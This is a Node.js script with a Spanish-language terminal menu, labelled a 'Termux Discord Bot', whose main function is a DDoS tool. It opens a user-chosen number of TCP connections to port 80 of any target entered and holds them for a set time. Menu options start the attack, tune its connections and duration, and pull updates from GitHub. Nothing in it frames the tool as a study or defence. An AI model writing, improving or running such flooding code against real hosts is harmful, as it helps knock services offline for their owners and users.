const net = require('net');
const rl = require('readline').createInterface({
input: process.stdin,
output: process.stdout
});

const colors = {
reset: '[0m',
bright: '[1m',
dim: '[2m',
underscore: '[4m',
blink: '[5m',
reverse: '[7m',
hidden: '[8m',
fg: {
black: '[30m',
red: '[31m',
green: '[32m',
yellow: '[33m',
blue: '[34m',
magenta: '[35m',
cyan: '[36m',
white: '[37m',
},
bg: {
black: '[40m',
red: '[41m',
green: '[42m',
yellow: '[43m',
blue: '[44m',
magenta: '[45m',
cyan: '[46m',
white: '[47m',
},
};

const decorations = {
underline: '[4m',
bold: '[1m',
italic: '[3m',
};

const ddosAttack = async (url, numConnections, attackDuration) => {
try {
console.log(`${colors.fg.green}Iniciando ataque DDoS...${colors.reset}`);
const sockets = [];
for (let i = 0; i < numConnections; i++) {
const socket = new net.Socket();
socket.connect(80, url, () => {
console.log(`Connected to ${url}`);
});
socket.on('data', (data) => {
console.log(`Received data from ${url}`);
});
socket.on('error', (err) => {
console.error(`Error: ${err}`);
});
sockets.push(socket);
}

setTimeout(() => {
console.log('Attack finished');
sockets.forEach((socket) => socket.destroy());
}, attackDuration * 1000);
} catch (error) {
console.error(`Error: ${error}`);
}
};

const updateCode = async () => {
try {
console.log(`${colors.fg.green}Actualizando código...${colors.reset}`);
const exec = require('child_process').exec;
exec('git pull origin main', (error, stdout, stderr) => {
if (error) {
console.error(`Error: ${error}`);
} else {
console.log(`${colors.fg.green}Código actualizado correctamente!${colors.reset}`);
}
});
} catch (error) {
console.error(`Error: ${error}`);
}
};

const showMenu = () => {
console.clear(); // Limpiar la consola
console.log(`${colors.fg.green}Bienvenido al Termux Discord Bot!${colors.reset}`);
console.log(`${colors.fg.yellow}Desarrollado por Keiji821${colors.reset}`);
console.log(`${colors.fg.cyan}⸂⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⸃${colors.reset}`);
console.log(`${colors.fg.green}1. Iniciar ataque DDoS${colors.reset}`);
console.log(`${colors.fg.cyan}2. Actualizar código desde GitHub${colors.reset}`);
console.log(`${colors.fg.yellow}3. Configurar conexiones simultaneas${colors.reset}`);
console.log(`${colors.fg.green}4. Aumentar potencia del ataque${colors.reset}`);
console.log(`${colors.fg.red}5. Salir${colors.reset}`);
console.log(`${colors.fg.cyan}⸌⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⸍${colors.reset}`);
rl.setPrompt(`${colors.fg.bright} ➤ ${colors.reset}`); // Establecer el texto de la casilla "Opción: "
rl.prompt(); // Mostrar la casilla "Opción:"
};

let numConnections = 100; // Número de conexiones simultaneas por defecto
let attackDuration = 60; // Duración del ataque por defecto

showMenu(); // Mostrar el menú principal al inicio

rl.on('line', (option) => {
switch (option.trim()) {
case '1':
console.log('Ingrese la URL del objetivo: ');
rl.question('URL: ', (url) => {
if (url === '') {
console.log('URL invalida');
showMenu();
} else {
ddosAttack(url, numConnections, attackDuration);
showMenu(); // Volver a mostrar el menú principal
}
});
break;
case '2':
updateCode();
showMenu(); // Volver a mostrar el menú principal
break;
case '3':
console.log('Ingrese el número de conexiones simultaneas: ');
rl.question('Conexiones: ', (conexiones) => {
if (conexiones === '') {
console.log('Valor invalido');
showMenu();
} else {
numConnections = parseInt(conexiones);
console.log(`Conexiones simultaneas establecidas en ${numConnections}`);
showMenu(); // Volver a mostrar el menú principal
}
});
break;
case '4':
console.log('Ingrese la duración del ataque (en segundos): ');
rl.question('Duración: ', (duration) => {
if (duration === '') {
console.log('Valor invalido');
showMenu();
} else {
attackDuration = parseInt(duration);
console.log(`Duración del ataque establecida en ${attackDuration} segundos`);
showMenu(); // Volver a mostrar el menú principal
}
});
break;
case '5':
console.log('Saliendo...');
process.exit();
break;
}
}).on('close', () => {
process.exit();
});